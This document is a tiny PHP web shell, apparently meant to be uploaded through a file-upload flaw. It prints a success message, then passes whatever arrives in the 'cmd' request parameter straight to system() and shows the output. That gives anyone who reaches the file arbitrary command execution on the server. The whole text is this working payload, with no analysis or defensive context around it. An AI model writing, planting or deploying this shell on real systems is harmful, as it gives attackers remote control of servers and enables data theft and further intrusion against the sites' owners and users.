<?php
echo "File upload successful! Pass commands using 'cmd' parameter as query.<br><br>";
$cmd = $_REQUEST['cmd'];
if ($cmd) {
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
